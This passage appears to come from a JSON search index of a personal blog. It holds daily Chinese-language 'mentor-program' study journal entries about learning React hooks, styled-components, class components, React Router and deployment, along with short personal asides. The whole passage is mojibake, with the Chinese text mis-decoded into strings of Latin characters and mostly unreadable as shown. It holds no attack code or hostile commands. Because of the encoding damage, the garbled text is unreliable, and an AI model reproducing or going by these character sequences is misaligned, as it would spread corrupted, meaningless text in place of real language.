ç­è§£åˆ°è‡ªå·±æœ‰æ™‚å€™ä¹ŸæœƒçŠ¯ä¸€äº›æ–°æ‰‹å¸¸çŠ¯çš„éŒ¯èª¤ï¼Œä¾‹å¦‚èªªã€Œè§£é¡Œçš„æ™‚å€™é‚Šå¯«é‚Šæƒ³æ€éº¼è§£ã€æˆ–æ˜¯ã€Œå˜—è©¦å¥—ç”¨éå»å­¸éçš„èªæ³•ã€ã€‚å¸Œæœ›å¯ä»¥åœ¨é€™ä¸€æ¬¡çš„è¤‡ç¿’ä¸­æ”¹å–„é€™å€‹å•é¡Œã€‚ é›–ç„¶æˆ‘è¦ºå¾—è™›æ“¬ç¢¼æœ‰é»å½†æ‰­ï¼Œç¸½æœƒä¸è‡ªè¦ºçš„å°±å¯«æˆç¨‹å¼ç¢¼ï¼Œå¤±å»äº†è™›æ“¬ç¢¼çš„é€šç”¨æ€§ã€‚ æ²’æœ‰ä»€éº¼è¨£ç«…ï¼Œå°±æ˜¯ä¸€è¡Œä¸€è¡Œå¤šç·´ç¿’ã€‚ é€™ä¹Ÿè¨±æ­£æ˜¯æˆ‘è©²åšçš„äº‹å§ï¼Œä¸éä¹Ÿå¸Œæœ›è‡ªå·±è¦æ‹¿æå¥½æ™‚é–“ï¼Œå¦å‰‡æœ¬æœ«å€’ç½®å°±ä¸å¥½äº†ã€‚ é¡Œå¤–è©±æ²’éŒ¯ï¼Œä»Šå¤©æ˜¯å†¬è‡³ï¼Œä½†ä¹Ÿæ˜¯æœ€ä¸å†·çš„ä¸€å¤©ï¼›ä¸éæ¹¯åœ“é‚„æ˜¯é‚£å€‹ç†Ÿæ‚‰çš„è€å‘³é“ï¼ˆä¹Ÿæ‰å‰å¹¾å¤©æ‰å‰›åƒéï¼‰ã€‚ è½‰çœ¼é–“å°±è¦åˆ°å¹´åº•äº†ï¼Œå¸Œæœ›è‡ªå·±çš„è¦åŠƒèƒ½å¤ ä¸€åˆ‡é †åˆ©ã€‚ æœŸè¨±æ˜å¤©çš„é€²åº¦æ˜¯æŠŠ [ALG101] çš„é€²åº¦çµ¦åšå®Œï¼ˆåŒ…å«å¯¦ä½œï¼‰ï¼Œé‚„æœ‰ [CS101] ä¸€äº›æ¼”ç®—æ³•çš„éƒ¨åˆ†æƒ³åšé»ç·´ç¿’è·Ÿç­†è¨˜ï¼Œæœ€å¾Œèƒ½é †ä¾¿åšä¸€ä¸‹æŒ‘æˆ°é¡Œçš„è©±å°±æ›´å¥½äº†ã€‚","link":"/2021/12/22/mentor-program-day11/"},{"title":"mentor-program-day110","text":"é€²å…¥æœ€å¾Œä¸€é—œã€‚ é€²åº¦ä»Šå¤©æŠŠ week17 æ­£å¼çµæŸäº†ï¼Œæ¥ä¸‹ä¾†å°±é–‹å§‹å»çœ‹ React çš„èª²ç¨‹äº†ã€‚ é›–ç„¶æœ¬ä¾†æ˜¯æƒ³æŠŠ week18 çµ¦åšå®Œçš„ï¼Œä¸éå¾Œä¾†æƒ³æƒ³é‚„æ˜¯å…ˆå­¸ React å¥½äº†ï¼Œå¸Œæœ›æ²’æœ‰åšå‡ºä¸å°çš„é¸æ“‡ã€‚ ç¸½ä¹‹å¸Œæœ›ä¸€åˆ‡é †åˆ©å§ï¼é™„å€‹ä»Šå¤©åšçš„ç­†è¨˜ï¼š åœ¨ Seuqelize ä¸­ä½¿ç”¨ç’°å¢ƒè®Šæ•¸çš„æ–¹å¼ é—œæ–¼ Express ä¸­çš„ session-secret å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©æ˜¯æ­£å¼æ¥è§¸ React çš„ç¬¬ä¸€å¤©ã€‚ ä»¥å¯«é Vue çš„ç¶“é©—ä¾†èªªï¼Œæˆ‘è¦ºå¾— React çš„å­¸ç¿’é–€æª»æ¯”è¼ƒé«˜ã€‚æ„æ€æ˜¯èªªä½  JS ä¸å¥½çš„è©±ä½ å¯èƒ½æœƒå¯«çš„å¾ˆæ‡·ç–‘äººç”Ÿã€‚ ä¸éå¾ä¸­ä¹Ÿèƒ½ç™¼ç¾ä¸€äº›æœ‰è¶£çš„äº‹æƒ…ï¼ŒReact ç‚ºäº†è®“ä»€éº¼äº‹æƒ…éƒ½è®Šæˆ JS çš„å½¢ç‹€ï¼Œè¨­è¨ˆå‡ºäº†å„ç¨®æœ‰è¶£çš„æ±è¥¿ã€‚åƒæ˜¯ CSS çš„å¯«æ³•ï¼ŒHTML çš„å¯«æ³•ç­‰ç­‰ï¼Œéƒ½è·Ÿ Vue å®Œå…¨ä¸åŒã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œç›®å‰è¦ºå¾—é€™æ˜¯å€‹è »æœ‰è¶£çš„æ¡†æ¶ã€‚å¸Œæœ›ä¹‹å¾Œèƒ½è·Ÿå®ƒæ‰“å¥½é—œä¿‚ã€‚ é¡Œå¤–è©±é‚„æ˜¯å¾ˆæƒ³å¿µå¯¶è²å€‘ï¼Œå¸Œæœ›å®ƒå€‘éƒ½æ˜¯å¿«æ¨‚çš„å¤©ä½¿ã€‚ æœŸè¨±ç¥æˆ‘è‡ªå·± React å­¸ç¿’é †åˆ©ï¼","link":"/2022/04/04/mentor-program-day110/"},{"title":"mentor-program-day111","text":"é¢¨å¹³æµªéœã€‚ é€²åº¦ä»Šå¤©æ˜¯ React çš„ç¬¬äºŒå¤©ï¼Œé«”é©—äº†äººç”Ÿç¬¬ä¸€æ¬¡çš„ CSS-In-JSï¼Œé‚„æœ‰ç¬¬ä¸€å€‹ hookï¼ˆuseStateï¼‰ï¼Œéš¨æ‰‹å¯«äº†ä¸€å€‹é™½æ˜¥çš„ Todo listï¼š é›–ç„¶æ‰å‰›å‰›é–‹å§‹ï¼Œä¸éè¦ºå¾—é‚„è »æœ‰è¶£çš„ï¼Œè‡ªå·±é‚„è »å–œæ­¡ React çš„æ€è€ƒæ–¹å¼çš„ï¼Œå¸Œæœ›æ¥ä¸‹ä¾†çš„éç¨‹ä¹Ÿèƒ½åƒç¾åœ¨ä¸€æ¨£ä¸€å¸†é¢¨é †ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å…ˆæŠŠé‡é»æ”¾åœ¨ CSS çš„éƒ¨åˆ†ï¼Œå¤§è‡´æŠŠ style-component çš„æ–‡ä»¶èªªæ˜è®€éäº†ã€‚æ„Ÿæƒ³æ˜¯é‚„è »å–œæ­¡ç”¨é€™ç¨®æ–¹å¼ä¾†å¯« CSS çš„ã€‚ å¦å¤–ä¹Ÿå­¸äº†ç¬¬ä¸€å€‹æœ€å¸¸ç”¨åˆ°çš„ hookï¼šuseStateï¼Œå…‰ç”¨é€™å€‹æ±è¥¿å°±å¯ä»¥å¯«ç°¡å–®çš„ Todo list äº†ã€‚ ä»¥å‰æˆ‘ä¸€ç›´è¦ºå¾—æ¡†æ¶ç”¨èµ·ä¾†æ²’æœ‰å¾ˆé †æ‰‹ï¼Œå› ç‚ºæ¡†æ¶çš„æ€è€ƒæ¨¡å¼è·Ÿ Vanilla JS æœ‰å¾ˆå¤§çš„ä¸åŒï¼Œå†åŠ ä¸ŠåŸç”Ÿ JS ä¸ç†Ÿçš„è©±å°±æœƒæ›´é›£ç†è§£æ¡†æ¶åˆ°åº•è§£æ±ºäº†ä»€éº¼å•é¡Œï¼Ÿç‚ºä»€éº¼è¦ç”¨æ¡†æ¶ï¼Ÿè«¸å¦‚æ­¤é¡çš„å•é¡Œã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œç¾åœ¨äº†è§£æ¡†æ¶å­˜åœ¨çš„æ„ç¾©æ˜¯ä»€éº¼ï¼Œä¹ŸçŸ¥é“ç‚ºä»€éº¼è¦ç”¨æ¡†æ¶ï¼Œå¸Œæœ›æ¥ä¸‹ä¾†å¯ä»¥æŠŠå®ƒç†Ÿèƒ½ç”Ÿå·§ã€‚ é¡Œå¤–è©±æœ€è¿‘æ‰¾åˆ°äº†ä¸€å€‹ä¸éŒ¯çš„å…¬åœ’ï¼Œåœ¨é‚£è£¡æ•£æ­¥ç‰¹åˆ¥èˆ’æœã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©çš„ React ä¸€æ¨£é †åˆ©ã€‚","link":"/2022/04/05/mentor-program-day111/"},{"title":"mentor-program-day113","text":"é‚„ä¸å¤ å¤šã€‚ é€²åº¦ä»Šå¤©æŠŠ React åŸºç¤çš„éƒ¨åˆ†çœ‹å®Œäº†ï¼Œåšäº†ä¸€äº›ç­†è¨˜ï¼š React çˆ¶å­å…ƒä»¶é–“çš„æºé€š React é—œæ–¼ state çš„ä¸€äº›æ¦‚å¿µ React é—œæ–¼ render React çš„ç¬¬ä¸€å€‹ hookï¼šuseState React çš„ç¬¬äºŒå€‹ hookï¼šuseRef React çš„ç¬¬ä¸‰å€‹ hookï¼šuseEffect React çš„ç¬¬å››å€‹ hookï¼šuseLayoutEffect é›–ç„¶èªªæ˜¯åŸºç¤ï¼Œä¸éå»æ˜¯å¾ˆé‡è¦çš„æ¦‚å¿µã€‚å¸Œæœ›åœ¨æ¥ä¸‹ä¾†çš„å¯¦ä½œç·´ç¿’å¾Œèƒ½å°å®ƒå€‘æ›´ç†Ÿæ‚‰ä¸€é»ã€‚ å­¸åˆ°çš„äº‹æƒ…hook ç¢ºå¯¦æ˜¯å¾ˆæ–¹ä¾¿çš„æ±è¥¿ï¼Œä¸éé›£çš„åœ°æ–¹åœ¨æ–¼è¦èƒ½çŸ¥é“åœ¨ä»€éº¼æ™‚é–“é»ç”¨å“ªä¸€å€‹ hook æ¯”è¼ƒæ­£ç¢ºã€‚é€™ä¹Ÿè€ƒé©—äº†ä¸€å€‹äººå° hook çš„ç†è§£ç¨‹åº¦ï¼Œå¦‚æœä½ ä¸å¤ ç†è§£èƒŒå¾Œçš„ä¸€äº›æµç¨‹è·Ÿæ¸²æŸ“æ©Ÿåˆ¶ï¼Œå¤§æ¦‚æœƒç”¨çš„äº‚ä¸ƒå…«ç³Ÿçš„å§ã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œæ—¢ç„¶å·²ç¶“å¼„æ‡‚ä¸€äº›æ¦‚å¿µäº†ï¼Œå‰©ä¸‹çš„å°±æ˜¯é ç·´ç¿’ä¾†æ…¢æ…¢è·Ÿ React æ‰“äº¤é“äº†ã€‚ ç”¨å°±å°äº†ï¼Œä¹…äº†å°±æœƒæ…¢æ…¢æŠ“åˆ°é‚£å€‹ pattern äº† å¸Œæœ›é€™å¥è©±æ˜¯çœŸçš„ï¼ŒåŠ æ²¹å§ï¼ é¡Œå¤–è©±æœ‰æ™‚å€™æœƒå¾ˆæ€•è‡ªå·±ç¾åœ¨åšäº†ä¸å°çš„é¸æ“‡ã€‚ è‡ªå¾å¯¶è²èµ°äº†ä»¥å¾Œï¼Œå°±æœƒé–‹å§‹æ€è€ƒä¸€äº›äº‹æƒ…ï¼Œæœƒä¸æœƒæŸä¸€å¤©çªç„¶è¢«å‘ŠçŸ¥å¥³æœ‹å‹åªå‰©ä¸‹å¤šä¹…å£½å‘½ï¼Ÿè€Œæˆ‘æ˜¯ä¸æ˜¯æœƒå¾Œæ‚”æ²’æœ‰åœ¨æœ‰é™çš„æ™‚é–“å»åšæˆ‘çœŸæ­£åœ¨æ„çš„äº‹æƒ…ï¼Ÿ å°æˆ‘è€Œè¨€ï¼Œå’Œå¥³æœ‹å‹ä¸€èµ·åº¦éæ¯ä¸€å¤©æ‰æ˜¯çœŸæ­£å¹¸ç¦çš„äº‹æƒ…ï¼Œæ˜¯é¡˜æ„æ”¾æ£„ä¸€åˆ‡ä¾†æ›å–çš„äº‹ç‰©ã€‚ æ„Ÿè¦ºåˆèªç„¡å€«æ¬¡äº†ã€‚ä½†æ˜¯å‘¢ï¼Œè‡ªå·±æ˜¯æ‰“å¾å…§å¿ƒçš„å¸Œæœ›ï¼Œé‚£ä¸€å¤©æ°¸é æ°¸é ä¸è¦åˆ°ä¾†ã€‚ æœŸè¨±æ¥ä¸‹ä¾†çš„æ—¥å­æ‡‰è©²éƒ½æ˜¯ React äº†ï¼Œç¸½è€Œè¨€ä¹‹å¸Œæœ›ä¸€åˆ‡é †åˆ©å§ã€‚","link":"/2022/04/07/mentor-program-day113/"},{"title":"mentor-program-day114","text":"å³å°‡çµæŸçš„åŸºç¤ï¼Œä¸éä¹Ÿé–‹å•Ÿå¦ä¸€å€‹é€²éšçš„é–‹å§‹ã€‚ é€²åº¦ä»Šå¤©é–‹å§‹ç ”ç©¶äº†ä¸€äº›å’Œæ•ˆèƒ½ç›¸é—œçš„ hooksï¼Œä¹Ÿå° React çš„é‹ä½œæ©Ÿåˆ¶æ›´æ¸…æ¥šä¸€äº›ï¼š ä»€éº¼æ˜¯ Virtual DOMï¼Ÿ React çš„ç¬¬äº”å€‹ hookï¼šmemo React çš„ç¬¬å…­å€‹ hookï¼šuseCallback React çš„ç¬¬ä¸ƒå€‹ hookï¼šuseMemo ç¾åœ¨æ»¿è…¦å­éƒ½æ˜¯ã€Œre-renderå—ï¼Ÿ é‚„æ˜¯ä¸ re-renderï¼Ÿã€ å­¸åˆ°çš„äº‹æƒ…Virtual DOM æ˜¯å€‹å­¸èµ·ä¾†è »ç¡¬çš„æ¦‚å¿µï¼Œå¾ä»¥å‰å­¸ Vue çš„æ™‚å€™å°±æœ‰ç¨å¾®è½éé€™æ±è¥¿ï¼Œä½†åªçŸ¥é“å®ƒæ˜¯å€‹è™›æ“¬çš„ DOM ç‰©ä»¶é€™æ¨£è€Œå·²ï¼Œæ²’æœ‰é‘½ç ”å¤ªå¤šã€‚é€™ä¸€æ¬¡åœ¨çœ‹éå¹¾ç¯‡å¯¦ä½œçš„æ–‡ç« å¾Œï¼Œæœ‰æ¯”è¼ƒç†è§£åº•å±¤å¤§æ¦‚æ˜¯æ€éº¼é‹ä½œçš„ï¼ˆæ‡‰è©²å§ï¼Œé›–ç„¶æ²’æœ‰è·Ÿè‘—å¯¦ä½œï¼Œå¤ªæ‡¶äº†ï¼‰ã€‚ è‡³æ–¼å…¶ä»–çš„æ–° hookï¼Œæ„Ÿè¦º memo å’Œ useCallback æ˜¯æ¯”è¼ƒå®¹æ˜“è¸©é›·çš„æ±è¥¿ï¼Œå¯èƒ½å°±å¤šè¸©å¹¾æ¬¡å°±æœƒæ…¢æ…¢ç†Ÿäº†å§ï½ é¡Œå¤–è©±ç¬¬ä¸€æ¬¡åƒé®ªé­šè‚‰ç‡¥é£¯ï¼Œæ„å¤–åœ°å¾ˆå¥½åƒã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠ React åŸºç¤çš„èª²ç¨‹çµ¦å‘Šå€‹æ®µè½ï¼Œæ¥ä¸‹ä¾†å°±è¦é€²å…¥å¯¦æˆ°äº†ã€‚","link":"/2022/04/08/mentor-program-day114/"},{"title":"mentor-program-day112","text":"ä¸€æ­¥ä¸€æ­¥å‘å‰é€²ã€‚ é€²åº¦ä»Šå¤©ç¹¼çºŒå­¸ React åŸºç¤ï¼Œä¹Ÿåšäº†ä¸€äº›ç­†è¨˜ï¼š ä¸‰ç¨®åœ¨ React ä¸­å¯« CSS çš„æ–¹å¼ Styled-components åŸºç¤ JSX çš„åŸç† React ä¹‹ Component åŸºç¤ é›–ç„¶ React å­¸èµ·ä¾†è »æœ‰è¶£çš„ï¼Œä¸éé‚„æ˜¯éœ€è¦ä¸€äº›æ™‚é–“ä¾†æ¶ˆåŒ– React çš„æ€ç¶­ï¼Œç¸½ä¹‹å°±ä¸€æ­¥ä¸€æ­¥ä¾†å§ï¼ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©å†æ¬¡è¤‡ç¿’äº†æœ‰é—œ useState çš„ç”¨æ³•ï¼Œè·Ÿä¸€äº› styled-component çš„æ–¹æ³•ï¼Œåƒæ˜¯å¯ä»¥æŠŠ CSS å¯«æˆä¸€å€‹å…±ç”¨çš„ function ä¹‹é¡çš„ã€‚ å¦å¤–ä¹Ÿå¾ PJ å¤§å¤§å¯«çš„ [Day 08 - è¨ˆæ•¸å™¨] ä¸€å€‹ä¸å¤ ï¼Œçµ¦æˆ‘ä¸€æ¬¡ä¾†åå€‹ - JSX ä¸­è¿´åœˆçš„ä½¿ç”¨ ä¸­å­¸åˆ°ã€Œåˆ©ç”¨ function ä¾†å›å‚³å¦ä¸€å€‹ functionã€çš„æ–¹å¼ä¾†å¯« codeï¼Œè¦ºå¾—æ˜¯å¾ˆæ©Ÿæ™ºçš„ä½œæ³•ã€‚ ç¸½è¦ºå¾—å¯«ç¨‹å¼èªè¨€æœ‰è¶£çš„åœ°æ–¹å°±æ˜¯é€™é»ï¼Œç¸½æœƒæœ‰äººæƒ³å‡ºå¾ˆå¥‡å¦™çš„ä½œæ³•ã€‚ æ¥è‘—ä¹Ÿæ‘¸äº†ä¸€é»å…¶ä»–çš„ hooksï¼Œå¦‚ useEffect å’Œ useRef é€™å…©å€‹ã€‚é‚„æ²’æœ‰å®Œå…¨å¼„æ‡‚ï¼Œæ‰€ä»¥æ˜å¤©è¦ä¾†ç¹¼çºŒåŠ æ²¹äº†ï¼ é¡Œå¤–è©±ä»Šå¤©åœ¨å¤œæ™šä¸­è·Ÿå¥³å‹ä¸€èµ·æ•£æ­¥èŠå¿ƒï¼Œæ„Ÿè¦ºå¾ˆå¹³å‡¡ï¼Œå»ä¹Ÿå¾ˆäº«å—é€™æ¨£çš„æ™‚å…‰ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©èƒ½åœ¨å¤šä¸€é»é€²åº¦å°±å¥½äº†ã€‚","link":"/2022/04/06/mentor-program-day112/"},{"title":"mentor-program-day115","text":"ç¹¼çºŒåŠªåŠ›å§ã€‚ é€²åº¦ä»Šå¤©ä¸€æ¨£æ˜¯ React çš„å…§å®¹ï¼Œå…ˆé™„ä¸Šç­†è¨˜ï¼š React å¯«ä¸€å€‹è‡ªå·±çš„ hookï¼ åˆæ¢ Class-component React class component çš„ç”Ÿå‘½é€±æœŸ React çš„ç¬¬å…«å€‹ hookï¼šuseContext èˆ‡ createContext æ„Ÿè¦ºè‡ªå·±çš„çŸ¥è­˜é‡è¶Šä¾†è¶Šè±å¯Œäº†ï¼Œå¸Œæœ›æ¥ä¸‹ä¾†çš„å¯¦æˆ°èƒ½å¥½å¥½ç™¼æ®ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©èŠ±äº†æ¯”è¼ƒå¤šæ™‚é–“ç ”ç©¶ Class componentï¼Œé‚„è¨˜å¾—åœ¨å‰›å…¥é–€ React æ™‚ï¼Œæœ‰è½éä¸å°‘å‰è¼©éƒ½èªªè¦å¾ class è·³åˆ° hook æœƒå¾ˆä¸ç¿’æ…£ï¼Œå› ç‚ºæœƒè¢«ã€Œç”Ÿå‘½é€±æœŸã€çš„è§€å¿µçµ¦ç¶ä½ï¼Œæ‰€ä»¥åœ¨æ¥è§¸ class ä¹‹å‰é‚„è »å¥½å¥‡åˆ°åº•æ˜¯å·®åœ¨å“ªçš„ï¼Œä»Šå¤©ç®—æ˜¯è§£æƒ‘äº†å§ã€‚ è‡ªå·±å¯«èµ·ä¾†çš„æ„Ÿæƒ³æ˜¯ï¼Œæ„Ÿè¦ºå°±è·Ÿ Vue çš„ç”Ÿå‘½é€±æœŸå¾ˆåƒï¼Œåœ¨ Vue è£¡é¢ä¹Ÿæœƒçµ¦å¦³å„ç¨®ç”Ÿå‘½é€±æœŸçš„ methodï¼ˆæˆ–æ˜¯è¢« Vue ç¨±ä½œ hookï¼‰ï¼Œä½ æƒ³åœ¨ä»€éº¼æ™‚å€™åšä»€éº¼äº‹æƒ…å°±å¯«åœ¨å°æ‡‰çš„ method è£¡ï¼Œè€Œ React çš„ class ä¹Ÿæ˜¯å·®ä¸å¤šçš„æ¦‚å¿µã€‚ React çš„ hook ç¢ºå¯¦æ˜¯ä¸€å€‹è »ä¸åŒçš„æ€ç¶­ï¼Œå¯«èµ·ä¾†ä¹Ÿç›¸å°ç›´è¦ºå¾ˆå¤šï¼Œæ€ªä¸å¾— hook æ¨å‡ºä»¥å¾Œå°±å¹¾ä¹å–ä»£ class äº†ï¼Œå› ç‚ºçœŸçš„ä¹¾æ·¨ä¹Ÿé †æ‰‹å¾ˆå¤šã€‚ é¡Œå¤–è©±å¥³å‹çš„åª½åª½ç…®çš„å’–å“©é£¯ç‰¹åˆ¥å¥½åƒï¼Œæ¯æ¬¡åƒåˆ°å°±æœƒç‰¹åˆ¥é–‹å¿ƒã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©ä¸€æ¨£é †åˆ©ï¼ŒåŠ æ²¹ã€‚","link":"/2022/04/09/mentor-program-day115/"},{"title":"mentor-program-day116","text":"å¯¦éš›ä¸Šé™£çš„ä¸€å¤©ã€‚ é€²åº¦ä»Šå¤©æ­£å¼é€²å…¥ React çš„å¯¦æˆ°å…§å®¹ï¼Œé‚„æ˜¯è€æ¨£å­çš„ç•™è¨€æ¿ï¼Œé€™å€‹ç‰ˆæœ¬æ‡‰è©²èƒ½å«åšã€ŒReact + SPA ç•™è¨€æ¿ã€ï¼Ÿç¸½ä¹‹å…ˆé™„å€‹ç´€éŒ„ï¼š å¯¦éš›ä¸Šé™£çš„æ„Ÿè¦ºçœŸçš„æ˜¯è¿·è¿·ç³Šç³Šï¼Œå‰›é–‹å§‹å¯«çš„æ™‚å€™å®Œå…¨ä¸çŸ¥é“èƒ½ç”¨ä¸€å€‹ state ä¾†å­˜ç•™è¨€å…§å®¹ã€‚ å¯èƒ½æ˜¯é‚„æ²’æŠ“åˆ°å¯« React çš„ Pattern å§ï¼Œä¸éå¤šç·´ç¿’å¹¾æ¬¡æ‡‰è©²å°±æœƒç¿’æ…£äº†ã€‚ å­¸åˆ°çš„äº‹æƒ…ä»Šå¤©é™¤äº†åšç•™è¨€æ¿ä»¥å¤–ï¼Œä¹Ÿä¹…é•çš„åˆ‡äº†å€‹ç‰ˆï¼Œä¸éé€™æ¬¡å°æœ‰ä¸€ä»¶äº‹ç‰¹åˆ¥æœ‰æ„Ÿè§¸ï¼Œå°±æ˜¯ï¼š æœ‰ U è³ªçš„è¨­è¨ˆç¨¿çœŸå¥½ã€‚ é‚„è¨˜å¾—æˆ‘åœ¨åš é¤å»³ç¶²ç«™ çš„æ™‚å€™ï¼Œé‚£å€‹å¾Œå°ç•«é¢çœŸçš„æ˜¯æˆ‘æƒ³äº†åŠå¤©æ‰å¼„å‡ºä¾†ï¼Œåˆ°æœ€å¾Œé‚„æ˜¯è¦ºå¾—æœ‰å¤ é†œï¼Œå“ˆå“ˆå“ˆå“ˆã€‚ æ‰€ä»¥é€™æ¬¡åšç•™è¨€æ¿å°±ç›´æ¥å» Frontend Mentor æ‰¾è¨­è¨ˆç¨¿ï¼ŒçœŸçš„æ˜¯åˆ‡èµ·ä¾†é †æš¢å¤šäº†ï¼Œç•«é¢ä¹Ÿå¥½çœ‹å¾ˆå¤šã€‚ ç¸½è€Œè¨€ä¹‹ï¼Œç‚ºä»€éº¼å·¥ç¨‹å¸«éƒ½å¾ˆå®³æ€•è¨­è¨ˆï¼Ÿå› ç‚º 100 å€‹å·¥ç¨‹å¸«è£¡é¢æœ‰ 87 å€‹éƒ½æ²’ä»€éº¼è¨­è¨ˆæ„Ÿè·Ÿç¾æ„Ÿï¼Œè€Œæˆ‘ä¹Ÿæ˜¯é‚£å…¶ä¸­ä¸€å€‹ã€‚ é¡Œå¤–è©±å¸Œæœ›ç–«æƒ…åˆ¥åˆçˆ†ç‚¸å•¦ rrrrrã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥æŠŠå¯¦æˆ°çš„éƒ¨åˆ†åšå®Œï¼Œç„¶å¾Œç¹¼çºŒæŠŠèª²ç¨‹çµ¦çœ‹å®Œã€‚","link":"/2022/04/10/mentor-program-day116/"},{"title":"mentor-program-day117","text":"ç¹¼çºŒå …æŒå§ã€‚ é€²åº¦ä»Šå¤©æŠŠæ˜¨å¤©å¯«å¥½çš„ React éƒ¨è½æ ¼åšæœ€å¾Œçš„å¾®èª¿ï¼Œä¸¦éƒ¨ç½²åˆ° GitHub ä¸Šï¼š é—œæ–¼éƒ¨ç½² React åšå¾—å¾ˆå®Œæ•´ï¼Œä¸åƒå¯« Vue çš„æ™‚å€™é‚„å¾—å¯«ä¸€å€‹ shell scriptï¼ŒReact ç›´æ¥é–‹ä¸€å€‹ CLI è®“ä½ ä¸€éµéƒ¨ç½²ï¼Œæœç„¶å·¥å…·å¯ä»¥è®“äººçœæ‰å¾ˆå¤šæ™‚é–“ã€‚ ä¸éé€™ä¹Ÿæœƒç”¢ç”Ÿå¦å¤–ä¸€å€‹å•é¡Œï¼Œå°±æ˜¯æœ‰æ™‚å€™ç°¡åŒ–å¤ªå¤šæ±è¥¿æ™‚åè€Œæœƒä¸çŸ¥é“èƒŒå¾Œåšäº†ä»€éº¼ã€‚åªèƒ½èªªè¦æ‡‚å¾—è‡ªå·±åšå–æ¨å§ï¼Œæœ€å¥½åœ¨ç”¨ä»»ä½•å·¥å…·å‰å…ˆç†è§£å®ƒå¹«ä½ åšäº†ä»€éº¼ï¼Œè€Œä¸æ˜¯å‚»å‚»çš„åªçŸ¥é“å¯ä»¥é€™æ¨£ç”¨ã€‚ æ¥è‘—ä¹Ÿé–‹å§‹åšä¸‹ä¸€å€‹å¯¦æˆ°ç·´ç¿’ã€Œéƒ¨è½æ ¼ã€ï¼Œé–‹å§‹å­¸ç¿’è·Ÿ Router æœ‰é—œçš„æ±è¥¿äº†ã€‚ é›–ç„¶ä¸€é–‹å§‹å°±è¢«æ–°èˆŠç‰ˆæœ¬çš„å•é¡Œçµ¦å¡äº†å¥½ä¹…ï¼ŒçœŸçš„è »è¨å­èˆŠç‰ˆæ–°ç‰ˆçš„é€™ç¨®å•é¡Œï¼Œå› ç‚ºç•¶è³‡è¨Šä¸å®Œæ•´çš„æ™‚å€™çœŸçš„å¾ˆé›£ debugï¼Œå¸Œæœ›ä¹‹å¾Œåœ¨è™•ç†é€™æ–¹é¢èƒ½çš„å•é¡Œæ™‚èƒ½æ›´ç†Ÿç·´ä¸€äº›ã€‚ å­¸åˆ°çš„äº‹æƒ…æ·ºè«‡æ–°æ‰‹åœ¨å­¸ç¿’ SPA æ™‚çš„å¸¸è¦‹å•é¡Œï¼šä»¥ Router ç‚ºä¾‹ æ˜¯å¥½çš„ä¸€ç¯‡æ–‡ç« ï¼Œçœ‹å®Œå¾ŒæŠŠå¹¾å€‹ä»¥å‰æ²’æœ‰å¾ˆæ‡‚çš„æ±è¥¿ææ‡‚äº†ï¼š ç‚ºä»€éº¼ SPA é‡æ–°æ•´ç†æœƒ 404ï¼Ÿ å‹•æ…‹è·Ÿéœæ…‹ç¶²ç«™å·®åœ¨å“ªï¼Ÿ ä»¥å‰åªæœ‰å¤§æ¦‚çŸ¥é“æ˜¯è·¯å¾‘çš„é—œä¿‚ï¼Œä½†é‚£æ™‚å€™é‚„æ²’ä»€éº¼ç¶²è·¯åŸºç¤çŸ¥è­˜ï¼Œæ‰€ä»¥å®Œå…¨çœ‹ä¸æ‡‚ç¶²è·¯ä¸Šèªªå¦‚æœæ˜¯ç”¨ History API ä¾†åšè·¯ç”±çš„è©±å¾Œç«¯å¾—è·Ÿè‘—åšèª¿æ•´ï¼Œåˆ°åº•æ˜¯ä»€éº¼æ„æ€ã€‚ é‚„æœ‰å‹•æ…‹è·Ÿéœæ…‹ç¶²ç«™çš„é—œéµé»æ˜¯å·®åœ¨å“ªï¼Ÿä»¥å‰æˆ‘ä¹Ÿèªªä¸å‡ºä¾†ã€‚ä½†ç¾åœ¨å¯ä»¥å¤§è²çš„èªªï¼š Server æœ‰æ²’æœ‰å¹«ä½ æŠŠæª”æ¡ˆã€Œåšè™•ç†ã€ è½å®Œé€™å€‹è«–é»å¾ŒçœŸçš„æ‰“é€šä»»ç£äºŒè„ˆï¼Œç¢ºå¯¦é€™å°±æ˜¯æœ€å¤§çš„å·®åˆ¥ã€‚ å¾Œä¾†é‚„æœ‰å­¸åˆ°ä¸€äº› React Router çš„æ±è¥¿ï¼Œå¤§è‡´ä¸Šå°±æ˜¯ç”¨ JavaScript ä¾†è®Šæ›´ç¶²å€çš„ç‹€æ…‹å§ï¼Œé€™é‚Šå°±ä¸ç´°è«‡äº†ï¼Œç­‰æˆ‘æ›´æ‡‚å¾Œå†èªªã€‚ é¡Œå¤–è©±é›–ç„¶åƒä¸åˆ°çœŸçš„ç‡’è‚‰ï¼Œä½†èƒ½åƒåˆ°å¥½åƒçš„çƒ¤é›äº•é£¯ä¹Ÿè »é–‹å¿ƒçš„ã€‚ æœŸè¨±å¸Œæœ›æ˜å¤©å¯ä»¥é †åˆ©æŠŠ React éƒ¨è½æ ¼çš„å¯¦æˆ°åšå¥½ã€‚","link":"/2022/04/11/mentor-program-day117/"},{"title":"mentor-program-day118","text":"å¸Œæœ›èƒ½ä¸€æ­¥ä¸€æ­¥åšå¥½ã€‚ é€²åº¦ä»Šå¤©ç¹¼çºŒåšéƒ¨è½æ ¼çš„å¯¦æˆ°ï¼Œç›®å‰æŠŠå¹¾å€‹åŠŸèƒ½çµ¦åšå¥½äº†ï¼š ä¸² API é¡¯ç¤ºæ‰€æœ‰æ–‡ç«  ä¸²æ¥ç™»å…¥ã€è¨»å†ŠåŠŸèƒ½ é¡¯ç¤ºå–®ç¯‡æ–‡ç« åŠŸèƒ½ ç”¨ React åš UI è™•ç†ç¢ºå¯¦æ¯” Vanilla JS è¼•é¬†è¨±å¤šï¼Œä¸éé‚„åœ¨æ…¢æ…¢ç¿’æ…£é€™ç¨® state çš„æ€è€ƒæ¨¡å¼ï¼Œç¸½ä¹‹å¤šåŠ æ²¹å§ã€‚ 